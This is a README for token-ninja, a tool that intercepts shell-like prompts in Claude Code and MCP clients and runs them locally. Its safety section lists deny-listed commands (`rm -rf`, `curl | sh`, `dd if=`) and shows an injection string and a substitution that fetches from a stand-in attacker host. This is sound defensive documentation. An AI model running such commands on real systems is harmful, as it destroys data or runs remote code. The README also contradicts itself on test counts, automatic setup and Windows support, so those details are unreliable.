<div align="center">

# token&#8209;ninja

### The Claude Code companion that pays zero tokens for commands your shell already knows how to run.

**Built for Claude Code first.** `token-ninja` hooks into Claude Code's
`UserPromptSubmit` event, intercepts commands like `git status`, `npm test`,
or `docker ps` **before** they become an API call, runs them locally, and
hands the result back to you — in the original colors, with a single dimmed
footer line acknowledging the save. The model is never invoked. Zero input
tokens, zero output tokens. Everything conversational flows through to
Claude untouched.

Other AI tools (Codex, Cursor, Aider, Gemini, Continue) are supported via
MCP, but the deepest, most invisible experience — the one that feels like
you're just using Claude normally — is Claude Code.

[![CI](https://github.com/oanhduong/token-ninja/actions/workflows/ci.yml/badge.svg?branch=main)](https://github.com/oanhduong/token-ninja/actions/workflows/ci.yml)
[![npm](https://img.shields.io/npm/v/token-ninja.svg?color=cb3837&logo=npm)](https://www.npmjs.com/package/token-ninja)
[![downloads](https://img.shields.io/npm/dw/token-ninja.svg?color=cb3837&logo=npm&label=downloads)](https://www.npmjs.com/package/token-ninja)
[![node](https://img.shields.io/node/v/token-ninja.svg?color=339933&logo=nodedotjs)](https://nodejs.org)
[![license](https://img.shields.io/github/license/oanhduong/token-ninja?color=blue)](LICENSE)
[![stars](https://img.shields.io/github/stars/oanhduong/token-ninja?style=flat&logo=github)](https://github.com/oanhduong/token-ninja/stargazers)
[![issues](https://img.shields.io/github/issues/oanhduong/token-ninja)](https://github.com/oanhduong/token-ninja/issues)
[![last commit](https://img.shields.io/github/last-commit/oanhduong/token-ninja)](https://github.com/oanhduong/token-ninja/commits/main)
[![MCP](https://img.shields.io/badge/MCP-compatible-7C3AED)](https://modelcontextprotocol.io)

[**Install**](#install) · [**Quickstart**](#quickstart) · [**How it works**](#how-it-works) · [**Rules**](#write-your-own-rules) · [**MCP**](#mcp-integration) · [**Safety**](#safety-model) · [**Benchmarks**](#benchmarks)

</div>

---

```console
# Inside a Claude Code session — just chat as usual. The output appears
# exactly as if you had typed the command in your terminal, keeping its
# native colors. A single dimmed footer line reports the save. That's the
# whole visual change. Conversational prompts flow through to Claude
# unchanged.

you › git status
On branch main
nothing to commit, working tree clean
⚡ ninja · saved ~424 tokens · git-status

you › git branch --show-current
main
⚡ ninja · saved ~416 tokens · git-branch-list

you › git log --oneline -10
f77f852 chore(main): release 0.3.0
6932f36 feat(setup): auto-register ninja mcp with Gemini CLI
1b323b2 fix(router): preserve ANSI colors when the hook short-circuits the model
89394ec feat(hook): replace PreToolUse Bash hook with UserPromptSubmit
…
⚡ ninja · saved ~611 tokens · git-log-passthrough

you › explain why this stack trace is blowing up in production
# No match (conversational) — prompt flows to Claude unchanged.
```

No prefix. No new commands to learn. Keep chatting with Claude Code the
way you already do — token-ninja quietly handles the boring stuff and
gets out of the way for everything else.

---

## Table of contents

- [Why token-ninja](#why-token-ninja)
- [Install](#install)
- [Quickstart](#quickstart)
- [How it works](#how-it-works)
- [Features](#features)
- [Supported AI tools](#supported-ai-tools)
- [Write your own rules](#write-your-own-rules)
- [Natural-language commands](#natural-language-commands)
- [MCP integration](#mcp-integration)
- [Configuration](#configuration)
- [Safety model](#safety-model)
- [Platform support](#platform-support)
- [Commands](#commands)
- [Benchmarks](#benchmarks)
- [Development](#development)
- [FAQ](#faq)
- [Troubleshooting](#troubleshooting)
- [Contributing](#contributing)
- [License](#license)

---

## Why token-ninja

Every trip to an LLM costs tokens, dollars, and seconds of latency. Yet a huge
share of what we ask AI coding assistants is utterly deterministic — listing
files, checking git status, running tests, showing recent commits. Those calls
don't need a model. They need a shell.

|                                    | Plain AI assistant | **token-ninja**            |
| ---------------------------------- | :----------------: | :------------------------: |
| `git status`                       | ~400 tokens        | **0 tokens, ~10 ms**       |
| `docker ps`                        | ~450 tokens        | **0 tokens, ~10 ms**       |
| `show recent commits`              | ~500 tokens        | **0 tokens, ~15 ms**       |
| `build the project` *(auto-detects `npm` / `cargo` / `go` / …)* | ~700 tokens        | **0 tokens, ~20 ms**       |
| `rm -rf /`                         | runs if model agrees | **blocked before exec**  |
| `explain this stack trace: …`      | ~2–5 k tokens      | passes straight through    |

The classifier runs in **~19 µs**. The safety validator runs in **~10 µs**.
Neither will ever be the slow part of your day.

## Install

**One line. Zero config. Starts working on your next AI session.**

```bash
npm install -g token-ninja
ninja setup
```

`ninja setup` registers `ninja mcp` as an MCP server in every AI client it
can find on your machine — Claude Code (`~/.claude.json`), Cursor
(`~/.cursor/mcp.json`), and Claude Desktop — so the next time you open your
AI tool, it already knows to consult token-ninja before spending tokens on
commands like `git status`, `npm test`, or `docker ps`.

For **Claude Code** specifically, setup also writes a `UserPromptSubmit`
hook into `~/.claude/settings.json`. That event fires *before* your prompt
turns into an API call — if token-ninja recognizes it with high confidence
(exact or prefix match), the hook executes locally and short-circuits the
model entirely. The prompt is never sent, the response is never generated:
**zero input tokens, zero output tokens.** Anything conversational flows
through to Claude untouched.

Existing MCP entries are preserved, each file is backed up once
(`*.token-ninja.bak`) before the first write, and malformed configs are
skipped safely instead of failing the install.

> **Why the second command?** `ninja setup` edits your shell rc file,
> registers MCP servers and installs a Claude Code hook. Those are changes
> outside the package directory, so they are not something `npm install`
> should do behind your back — and installs run with `--ignore-scripts`
> would silently skip them anyway. Set `TOKEN_NINJA_AUTO_SETUP=1` before
> installing if you want it to run automatically.
>
> **Requirements:** Node ≥ 20, and a POSIX shell — see
> [Platform support](#platform-support).
>
> **Roll back any time:** `ninja uninstall` — removes the MCP entry from
> every client config it wrote to, and the UserPromptSubmit hook from
> `~/.claude/settings.json`.

## Quickstart

**There's no new command to learn.** After `npm install -g token-ninja`,
open Claude Code and start chatting. Commands render with their native
ANSI colors; the footer is dimmed so it recedes.

```console
you › git status
On branch main
nothing to commit, working tree clean
⚡ ninja · saved ~424 tokens · git-status

you › npm test
 Test Files  21 passed (21)
      Tests  312 passed (312)
   Duration  4.16s
⚡ ninja · saved ~2,362 tokens · npm-run-known

you › docker ps
CONTAINER ID   IMAGE         STATUS         NAMES
a7f3c9e21b4d   postgres:16   Up 2 hours     db
51e2d7f0a8c6   redis:7       Up 2 hours     cache
⚡ ninja · saved ~452 tokens · docker-ps

you › git diff
(no changes)
⚡ ninja · saved ~402 tokens · git-diff

you › why is my React state not updating when I click the button?
# No match (conversational) — token-ninja passes through. The model answers normally.
```

Check how many tokens you've saved at any time:

```bash
ninja stats
```

Handy extras:

- `ninja rules test "your command"` — dry-run the classifier against any
  input (no execution) and see which rule would fire.
- `ninja setup` — re-run auto-setup; `ninja setup --dry-run` previews without
  writing; `ninja setup --no-mcp` skips MCP registration.
- `ninja uninstall` — remove everything token-ninja added.

## How it works

```text
your input
    │
    ▼
┌────────────────────┐    blocked?    ┌──────────────────────┐
│  safety validator  │ ─────────────► │  fall back to AI     │
└────────────────────┘                │  (let a human review) │
    │ allowed                         └──────────────────────┘
    ▼
┌────────────────────┐    no match    ┌──────────────────────┐
│   classifier       │ ─────────────► │  fall back to AI     │
│ exact → prefix →   │                │  (pass unchanged)    │
│ regex → NL         │                └──────────────────────┘
└────────────────────┘
    │ match
    ▼
┌────────────────────┐    blocked?    ┌──────────────────────┐
│  safety (again, on │ ─────────────► │  fall back to AI     │
│ resolved command)  │                └──────────────────────┘
└────────────────────┘
    │ allowed
    ▼
┌────────────────────┐
│  exec in your      │  ──► stdout / stderr
│  shell, record hit │  ──► ninja saved ~N tokens
└────────────────────┘
```

**Match order is strict**: exact → prefix → regex → natural-language keywords.
The first confident match wins. Safety is checked **twice** — on the raw input
and on the resolved command — so template expansion can never smuggle a
dangerous command past the classifier.

## Features

- **Claude-Code-native UX**: the `UserPromptSubmit` hook fires before your
  prompt becomes an API call. On a confident match the hook short-circuits
  the model and hands back the captured output in its **original ANSI
  colors**, followed by a single dimmed footer line (`⚡ ninja · saved ~N
  tokens · rule-id`). No banner, no prefix, no new commands — the
  interaction looks exactly like you ran the command in your terminal.
- **Huge built-in rule set**: **765 rules across 46 tool domains** covering
  thousands of real commands — git (+ plumbing), GitHub CLI, npm, pnpm,
  yarn, bun, cargo, go, rust, java, kotlin, python, ruby, php, docker,
  kubernetes, database, network, filesystem, archive, process management,
  test runners, linters, text processing, build tools (make, just, task,
  mage, bazel, buck2, cmake, ninja, meson), **modern CLI (ripgrep, fd, bat,
  eza, jq, yq, fzf, delta, hyperfine, tldr, btop, glow)**, editors (VS
  Code, Cursor, Nvim, JetBrains, Helix, Zed), system info, **cloud CLIs
  (AWS, Azure, gcloud, Vercel, Netlify, Heroku, Fly, Railway, doctl)**,
  **IaC (Terraform, Ansible, Vagrant, Pulumi, Packer, CDK)**, **bundlers
  (Vite, Turbo, esbuild, Parcel, Rollup, Webpack, Rspack, tsup, Nx)**,
  **container tools (docker, podman, nerdctl, buildah, skopeo, crane,
  dive, trivy, cosign, grype, syft)**, **Kubernetes ecosystem (kubectl,
  kubectx/kubens, k9s, kind, minikube, k3d, colima, stern, velero,
  kubeseal)**, **gitops (argocd, flux, skaffold, tilt, fastlane,
  pre-commit)**, **helm + kustomize + helmfile**, **secrets / infra
  (vault, nomad, packer, sops, age, 1password, bitwarden)**, Deno, Elixir,
  Dart/Flutter, process supervisors, env managers, distributed systems,
  and natural-language mappings. Run `ninja rules list` to see everything
  loaded.
- **Fast**: ~19 µs per classification, ~10 µs per safety check (warm JIT).
- **Safe by construction**: layered deny-list blocks `rm -rf /`, `sudo`,
  `git push --force`, `DROP TABLE`, `curl | sh`, `dd if=`, `mkfs`, …
  including homoglyph, NFKC, chained, and base64-decoded evasion. Safety
  is validated **twice**: once on the raw prompt and once on the expanded
  command.
- **Battle-tested**: 396 tests across 28 files covering classifier edge
  cases, safety bypasses, conversational look-alikes, hook safeguards, and
  ≥99% rule coverage over 1090 real-world fixture commands. v8 coverage
  holds at 90%+ lines / 95%+ functions on all router/safety/rules code.
- **Zero-setup**: `npm install -g` is literally the whole install. A
  postinstall hook registers the `UserPromptSubmit` hook in Claude Code
  *and* the MCP server in every other AI client it detects. `ninja
  uninstall` reverses it.
- **MCP-native**: exposes `maybe_execute_locally` over stdio so agents
  (Codex, Cursor, Aider, Gemini, Continue, any MCP client) can consult the
  router *before* generating tokens.
- **Pluggable**: drop a `.yaml` into `~/.config/token-ninja/rules/` to add
  your own patterns. User rules override builtins by id.
- **Telemetry built in**: `ninja stats` shows hit rate, top rules, and an
  estimate of the tokens you've saved to date.
- **Dry-run friendly**: `ninja rules test "…"` shows which rule would fire
  for any input, without executing anything.
- **Escape hatches**: prefix a prompt with `?`, `/raw`, or `/claude` to
  bypass the hook for that message. Or set
  `intercept_user_prompts: false` in `~/.config/token-ninja/config.yaml`
  to disable interception globally while keeping the MCP integration
  active.

## Supported AI tools

**First-class (zero-token interception):**

| Tool        | Integration                                                                              |
| ----------- | ---------------------------------------------------------------------------------------- |
| Claude Code | `UserPromptSubmit` hook in `~/.claude/settings.json` **+** MCP in `~/.claude.json` |

The hook is the headline feature. It sees every user prompt before it
becomes an API call and can short-circuit the model entirely — which is
why Claude Code is where you'll see the biggest token savings.

**MCP-supported (agent opts in by calling the tool):**

| Tool            | Integration                                                                          |
| --------------- | ------------------------------------------------------------------------------------ |
| Cursor          | `~/.cursor/mcp.json`                                                                 |
| Claude Desktop  | `~/Library/Application Support/Claude/claude_desktop_config.json` (macOS), `%APPDATA%\Claude\…` (Windows), `$XDG_CONFIG_HOME/Claude/…` (Linux) |
| Codex / Aider / Gemini / Continue | Register `ninja mcp` as a stdio MCP server; `ninja setup` auto-detects what's installed. |

Any other MCP-capable client works too — point it at `ninja mcp` and
you're in. Installed a new AI tool later? Re-run `ninja setup`; it's
idempotent.

## Write your own rules

Rules are plain YAML. They live in `~/.config/token-ninja/rules/*.yaml`
(or whatever `custom_rules_dir` points at — `ninja setup` pre-creates the
directory for you). Rules with the same `id` as a built-in win, so you can
also shadow or replace a built-in by redefining it.

### 60-second walkthrough

**1. Create a file:**

```bash
mkdir -p ~/.config/token-ninja/rules
$EDITOR ~/.config/token-ninja/rules/myteam.yaml
```

**2. Add one or more rules:**

```yaml
domain: myteam
rules:
  - id: deploy-staging
    match:
      type: exact
      patterns:
        - "deploy staging"
        - "ship to staging"
    action:
      type: shell
      command: "./scripts/deploy.sh staging"
    safety: write-network

  - id: show-routes
    match:
      type: nl
      keywords:
        - ["show", "routes"]
        - ["list", "routes"]
    action:
      type: shell
      command: "rails routes | head -50"
    safety: read-only

  - id: run-script
    match:
      type: prefix
      patterns: ["run script"]
    action:
      type: shell
      command: "./scripts"
      args_passthrough: true
    safety: write-confined
```

**3. Dry-run to confirm the classifier picks your rule:**

```bash
ninja rules test "deploy staging"
# matched rule : deploy-staging
# domain       : myteam
# matched via  : exact
# safety tier  : write-network
# would run    : ./scripts/deploy.sh staging
```

**4. Check the health of your install:**

```bash
ninja doctor
# reports rule count, AI adapters detected, shim/MCP/hook status, etc.
```

That's it — the next time Claude Code sees `deploy staging` it runs locally
and never hits the model.

See [`src/rules/builtin/*.yaml`](src/rules/builtin) for **765 production-grade
examples across 46 domains**.

| Match type | When to use                                                        |
| ---------- | ------------------------------------------------------------------ |
| `exact`    | The input must equal one of the patterns (hash-indexed, O(1)).     |
| `prefix`   | The input starts with one of the patterns; longest match wins.     |
| `regex`    | Arbitrary capture groups. Used for templated commands.             |
| `nl`       | Natural-language keyword groups, e.g. `["show", "recent", "commits"]`. |

| Safety tier        | Means                                                 |
| ------------------ | ----------------------------------------------------- |
| `read-only`        | Cannot modify the user's filesystem.                  |
| `write-confined`   | Writes only inside CWD / config dir / build outputs.  |
| `write-network`    | May reach the network (e.g. `npm install`).           |
| `blocked`          | Never execute locally; always fall back to AI.        |

**Template variables** available in `command:`
`{{input}}`, `{{args}}`, `{{arg1}}` … `{{arg9}}`, `{{message}}`, `{{branch}}`,
`{{target}}`, `{{path}}`, `{{script}}`, `{{pkg}}`.

## Natural-language commands

Many built-in rules match plain English, not just shell syntax:

| You type                   | Ninja runs                                  |
| -------------------------- | ------------------------------------------- |
| `show recent commits`      | `git log --oneline -20`                     |
| `what branch am I on`      | `git branch --show-current`                 |
| `list docker containers`   | `docker ps`                                 |
| `what's using port 3000`   | `lsof -i :3000`                             |
| `build the project`        | auto-detects `npm` / `pnpm` / `cargo` / `go` / … |
| `run the tests`            | auto-detects the test runner                |

Use `ninja rules test "your command"` to dry-run the classifier against any input.

## MCP integration

token-ninja talks to most AI tools through the Model Context Protocol: it
exposes a single stdio tool (`maybe_execute_locally`) that the agent calls
on every command it's about to run. If token-ninja recognizes the command,
it answers with the output directly; if not, the agent proceeds as usual.

### Claude Code: UserPromptSubmit hook (real savings)

The MCP server alone doesn't save tokens in Claude Code because the model
rarely consults MCP tools before the Bash built-in, and once a tool result
is in context it counts the same tokens whether it came from Bash or an
MCP call. To save real tokens we have to intercept *before* the prompt
becomes an API call. That's what the `UserPromptSubmit` hook does:

```jsonc
{
  "hooks": {
    "UserPromptSubmit": [
      {
        "hooks": [
          { "type": "command", "command": "node /abs/path/to/hooks/claude-code-user-prompt.cjs" }
        ]
      }
    ]
  }
}
```

Every prompt you type passes through `ninja route --strict` first. If a
high-confidence rule matches, the command runs locally and the captured
output is rendered back to you — **the model is never invoked, no input
tokens consumed, no output tokens generated.** If nothing matches, the
prompt flows to Claude unchanged. A real turn-level save, not a cosmetic
one.

**Safeguards against mis-interception.** Conversational prompts should
never be hijacked, so the hook layers five filters:

1. **Strict routing** — only `exact` and `prefix` matches (no NL, no regex).
2. **Length cap** — prompts longer than 80 chars skip (literal commands are short).
3. **Keyword blocklist** — `explain`, `why`, `how`, `review`, `suggest`,
   `teach`, `help me`, `should i`, `tell me about`, `walk me through`.
4. **Escape prefixes** — start a prompt with `?`, `/raw`, or `/claude` to
   force it through to the model this once.
5. **Global opt-out** — set `intercept_user_prompts: false` in
   `~/.config/token-ninja/config.yaml`.

Install control:

- `ninja setup --no-hook` — skip just the prompt hook (MCP still registered).
- `ninja setup --no-mcp` — skip just MCP (hook still installed).
- `ninja uninstall` — removes both, plus any shell-rc shims, plus any
  legacy `PreToolUse` Bash entry left by older versions.

**You don't need to configure this manually.** `ninja setup` (the postinstall
hook) merges an entry like the one below into:

- `~/.claude.json` (Claude Code)
- `~/.cursor/mcp.json` (Cursor)
- `~/Library/Application Support/Claude/claude_desktop_config.json` (Claude
  Desktop, macOS — Windows and Linux paths are handled too)

```jsonc
{
  "mcpServers": {
    "token-ninja": {
      "command": "ninja",
      "args": ["mcp"]
    }
  }
}
```

Existing entries are preserved; each file is backed up once
(`*.token-ninja.bak`) before the first modification. To opt out:
`ninja setup --no-mcp`. To remove just the MCP entries: `ninja uninstall`.

If you still want to do it yourself — e.g. a project-local `.mcp.json` or an
MCP client we don't know about — the manual command is:

```bash
ninja mcp    # stdio server exposing maybe_execute_locally
```

Each call the model makes looks like:

```jsonc
// handled locally
{ "handled": true, "stdout": "…", "stderr": "…", "exit_code": 0,
  "rule_id": "git-status", "tokens_saved_estimate": 512 }

// AI should handle it
{ "handled": false, "reason": "no_match" }
```

### Cookbook: using ninja from a custom MCP client

If you're writing your own Claude/agent harness, register `ninja mcp` like
any other stdio server and call `maybe_execute_locally` on every command
the model wants to run. Below is a minimal recipe using the official
Model Context Protocol Node SDK (the same one ninja itself links against).

```ts
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";

// 1. Spawn `ninja mcp` as a stdio MCP server and connect to it.
const transport = new StdioClientTransport({ command: "ninja", args: ["mcp"] });
const client = new Client({ name: "my-harness", version: "0.1.0" }, { capabilities: {} });
await client.connect(transport);

// 2. Before executing any command the LLM asked for, ask ninja first.
async function tryLocal(command: string): Promise<
  | { handled: true; stdout: string; stderr: string; exitCode: number; ruleId: string }
  | { handled: false; reason: string }
> {
  const res = await client.callTool({
    name: "maybe_execute_locally",
    arguments: { command },
  });
  const text = (res.content as Array<{ type: string; text: string }>)
    .filter((c) => c.type === "text")
    .map((c) => c.text)
    .join("");
  const parsed = JSON.parse(text);
  if (parsed.handled) {
    return {
      handled: true,
      stdout: parsed.stdout,
      stderr: parsed.stderr,
      exitCode: parsed.exit_code,
      ruleId: parsed.rule_id,
    };
  }
  return { handled: false, reason: parsed.reason };
}

// 3. Wire it into your command loop.
const result = await tryLocal("git status");
if (result.handled) {
  // Feed the captured output back to the model as a tool result. Do NOT
  // re-run the command yourself — ninja already did.
  console.log(result.stdout);
} else {
  // Fall back to your normal LLM+shell flow.
}
```

Notes:

- `maybe_execute_locally` never falls back to an AI tool — that's the
  caller's job. It only returns `handled:true` or a `reason`.
- Safety is validated twice inside ninja (raw input + resolved command), so
  you can trust `handled:true` outputs without re-checking.
- For programmatic usage without MCP at all, import from the package root:

  ```ts
  import { routeOnce, validate, loadRules } from "token-ninja";

  const result = await routeOnce("git status", { cwd: process.cwd() });
  ```

  The package entry is a library — importing it does not start the CLI — and
  ships TypeScript declarations. Deep paths such as
  `token-ninja/dist/router/route-once.js` are no longer importable; use the
  root export.

## Configuration

You don't need to touch this to get started — the defaults work out of the
box. If you want to tune things:

`~/.config/token-ninja/config.yaml`

```yaml
default_ai_tool: claude                        # who gets the fallback
fallback_command: "{{tool}} {{input}}"          # see the note below
custom_rules_dir: ~/.config/token-ninja/rules  # where your own rules live
intercept_user_prompts: true                   # Claude Code hook may short-circuit
exec:
  timeout_ms: 120000                           # kill a local command after this
  max_output_bytes: 1048576                    # truncate captured output past this
stats:
  enabled: false                               # set false to record nothing at all
  show_savings_on_exit: true                   # "⚡ handled by token-ninja" line
  verbose: false
```

`exec.timeout_ms` and `exec.max_output_bytes` are what keep a local hit from
costing more than the AI round-trip it replaced: an MCP caller cannot Ctrl-C
a command that never exits, and a command that prints 40 MB would spend all
of it as context tokens. Set either to `0` to disable that bound.

`fallback_command` is a **shell** template, used only when you change it from
the default. `{{tool}}` and `{{input}}` are shell-quoted before substitution,
so a command that failed the safety check cannot break out of the quoting —
but everything else you put in the template runs as you wrote it.

Environment variables:

| Variable                          | Effect                                                       |
| --------------------------------- | ------------------------------------------------------------ |
| `TOKEN_NINJA_AUTO_SETUP=1`        | Run `ninja setup` automatically during `npm i -g`.           |
| `TOKEN_NINJA_SKIP_POSTINSTALL=1`  | Silence the postinstall message entirely.                    |
| `CLAUDE_CONFIG_PATH=<path>`       | Override the Claude Code config path used by `ninja setup`.  |
| `XDG_CONFIG_HOME`                 | Honored for the token-ninja config dir and Claude Desktop on Linux. |

## Safety model

Every input is split into pipeline segments and each segment is tested against
a hard deny-list (see [`src/safety/denylist.ts`](src/safety/denylist.ts)).

What we block:

- `rm -rf` on any system path
- privilege escalation (`sudo`, `doas`)
- remote-code-execution pipes (`curl | sh`, `wget | bash`, `curl | python`)
- disk destroyers (`dd if=`, `mkfs`, `> /dev/sd*`)
- git footguns (`push --force` — but not `--force-with-lease`; `reset --hard`)
- SQL footguns (`DROP TABLE`, `DELETE` / `UPDATE` without `WHERE`)
- container / cluster footguns (`docker system prune -af`, `kubectl delete`
  without `--dry-run`)
- **command substitution** — `$(…)`, backticks and `<(…)`. The validator
  reasons about text and cannot know what a substitution expands to at run
  time, so `ls $(curl -s http://attacker/x)` is refused outright rather than
  vetted on the harmless-looking outer command
- **evasion tricks**: homoglyph lookalikes (`ѕudo` with Cyrillic `ѕ`), NFKC
  normalization attacks, chained `&& / ; / |`, base64 decode piped to a shell

Deny-listed inputs **never execute locally**. They fall back to the AI, where a
human can review the explanation before anything runs.

**The fallback does not re-introduce what the deny-list rejected.** A blocked
command is handed to your AI tool as a single argument, with no shell in
between — so `git status; rm -rf ~` reaches Claude as one opaque string to
explain, not as two commands to run. (Before 0.6.0 this path interpolated the
input into a shell command unquoted, which made every deny pattern advisory;
`tests/fallback-injection.test.ts` now covers it.)

Rules marked `requires_tty` (`docker exec -it`, `kubectl exec -it`) are handed
back rather than run headless, since capturing their output would either hang
them or fail with *the input device is not a TTY*.

## Platform support

| Platform                    | Status                                             |
| --------------------------- | -------------------------------------------------- |
| Linux, macOS                | Supported and tested in CI                          |
| WSL                         | Supported (reports as Linux)                        |
| Windows (native cmd/PowerShell) | **Not supported**                               |

`ninja setup` writes shell functions into `~/.bashrc`, `~/.zshrc` or the fish
config, and resolves the real AI binary with `command -v`. None of that has a
native-Windows equivalent today, so the shim and setup flow are POSIX-only.
The package still compiles and packs on Windows in CI so the win32 code paths
in `src/` cannot rot, and the MCP server itself is portable — a Windows user
can register `ninja mcp` by hand and use the tool through their AI client
without the shell shim.

## Commands

You almost never need these — setup is automatic. Kept for diagnostics and
power users.

```
ninja setup [--dry-run] [--no-mcp] [--no-hook] [--tool …]
                              shell shims + register token-ninja with every AI
                              client it can detect; run this after install
ninja doctor [--json]         diagnose the install (rules, shim, MCP, hook)
ninja uninstall               undo setup; remove MCP entries from client configs
ninja mcp                     run the stdio MCP server (what the AI tool calls)
ninja stats [--json] [--reset]
                              see tokens saved, top rules, hit rate
ninja rules list [--domain …] [--json]
ninja rules test <input…>     dry-run the classifier against an input
```

## Benchmarks

`token-ninja` is a shell-adjacent tool — correctness and safety are
non-negotiable. The test suite is the safety net.

| Metric                          | Value                              |
| ------------------------------- | ---------------------------------- |
| Test files                      | **28**                             |
| Tests                           | **391** (all passing)              |
| Line coverage                   | **88.0%** &nbsp;(threshold: 86%)   |
| Branch coverage                 | **81.0%** &nbsp;(threshold: 79%)   |
| Function coverage               | **94.0%** &nbsp;(threshold: 92%)   |
| Statement coverage              | **88.0%** &nbsp;(threshold: 86%)   |
| Real-command fixture hit-rate   | **100%** on 657 commands (floor: 85%) |
| `classify()` benchmark          | **~19 µs/call** (10 k in < 800 ms) |
| `validate()` benchmark          | **~4.5 µs/call** (10 k in < 100 ms) |

Coverage is enforced by `vitest` + `@vitest/coverage-v8` across all of
`src/`, excluding entry points and type-only modules — including `setup/`
and `doctor/`, the code that edits your shell rc file.

CI gates (see [`.github/workflows/ci.yml`](.github/workflows/ci.yml)):

- `lint` — ESLint flat config, typed rules
- `typecheck` — `tsc --noEmit`
- `docs` — `rule-stats:check`; fails when the counts in this README drift
- `audit` — blocking on production dependencies, reporting on dev
- `dependency-review` — on PRs, flags high-severity and copyleft additions.
  Skipped until you enable Dependency graph in repo settings and set the
  `DEPENDENCY_REVIEW=true` Actions variable; see the comment in `ci.yml`
- `build` — emits `dist/`, copies YAML rules, runs `npm pack --dry-run`
- `build (windows)` — compile + pack only; the suite is POSIX-only
- `test` — Node 20 & 22 on `ubuntu-latest`, plus Node 20 on `macos-latest`
- `bench` — benchmark budgets, scaled for runner noise
- CodeQL — `security-extended`, weekly and on every PR

Benchmarks live outside `npm test` (a wall-clock budget says as much about
the machine as about the code). Run them with `npm run bench`; assertions
scale automatically on CI via `BENCH_FACTOR`, and `BENCH_FACTOR=1` gives
strict local numbers.

## Development

```bash
git clone https://github.com/oanhduong/token-ninja
cd token-ninja
npm install

npm run lint             # eslint flat config
npm run typecheck        # tsc --noEmit
npm run build            # tsc + copy YAML rules to dist/
npm test                 # vitest run, 396 tests
npm run test:watch       # watch mode
npm run test:coverage    # v8 coverage, thresholds enforced
npm run bench            # benchmark budgets (not part of npm test)
npm run rule-stats:sync  # rewrite rule/test counts in the docs
npm run rule-stats:check # fail if those counts have drifted
```

Handy development commands:

```bash
# Dry-run the classifier (no execution)
npx tsx src/cli.ts rules test "your command"

# Full router dry-run (prints the resolved command)
npx tsx src/cli.ts --dry-run "your command"

# List built-in rules
npx tsx src/cli.ts rules list --domain git
```

## FAQ

**What does the postinstall hook actually change on my machine?**
It merges a single `token-ninja` entry into each AI client's MCP config
file — `~/.claude.json`, `~/.cursor/mcp.json`, and Claude Desktop's
OS-specific config. Nothing else is touched. Every file it writes is backed
up once (`*.token-ninja.bak`) before the first modification, and every
unrelated key is preserved. Run `ninja uninstall` to remove it, or set
`TOKEN_NINJA_SKIP_POSTINSTALL=1` at install time to skip the hook entirely.

**Does it work if I don't use Claude Code / Cursor / Claude Desktop?**
Yes — any MCP-capable client works. Point its server config at
`ninja mcp`. Non-MCP tools can still use token-ninja as a library or via
the `maybe_execute_locally` stdio protocol directly.

**What happens if a rule misclassifies my command?**
Nothing dangerous: safety is checked twice, and any resolved command that
doesn't match its declared safety tier is blocked — the agent is told
"handle this yourself" and takes over as if token-ninja weren't there.
If the match itself is wrong (e.g. prints the wrong thing), disable that
rule by shadowing its id in a file under `~/.config/token-ninja/rules/`.

**How is "tokens saved" calculated?**
Each rule carries a `tokens_saved_estimate`, or we estimate from input
length + captured output + a 400-token system-prompt overhead. See
[`src/telemetry/stats.ts`](src/telemetry/stats.ts).

**Does it work on Windows?**
Yes. The router and MCP server run anywhere Node 20+ runs; the auto-setup
handles the Windows Claude Desktop config path (`%APPDATA%\Claude\…`) out
of the box.

## Troubleshooting

Start with `ninja doctor` — it prints a health check of the config, rules,
shell shim, MCP entries, Claude hook, and stats file, with a specific fix
hint for every failure.

```bash
ninja doctor           # human-readable report
ninja doctor --json    # machine-readable; exit 1 on problems
```

For longer explanations of common issues — hook not firing, stats not
updating, a rule not matching, MCP unavailable, postinstall skipped, or
safety false positives — see [TROUBLESHOOTING.md](TROUBLESHOOTING.md).

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md). New rules are always welcome — the
fastest way to help is to browse
[`tests/fixtures/real-commands.txt`](tests/fixtures/real-commands.txt) for
commands that currently miss and add a rule covering them.

1. Pick the narrowest match type (`exact` > `prefix` > `regex` > `nl`).
2. Pick the right safety tier (`read-only` < `write-confined` < `write-network`
   < `blocked`).
3. Add at least one fixture line to `tests/fixtures/real-commands.txt`.
4. `npm test` — the coverage suite enforces a ≥ 85 % hit rate on fixtures.

Security issues: see [SECURITY.md](SECURITY.md). Community norms:
[CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md).

## License

[MIT](LICENSE) © token-ninja contributors.

---

<div align="center">

If token-ninja saved you tokens today, consider dropping a
[star on GitHub](https://github.com/oanhduong/token-ninja) —
it's how the next person finds us.

</div>
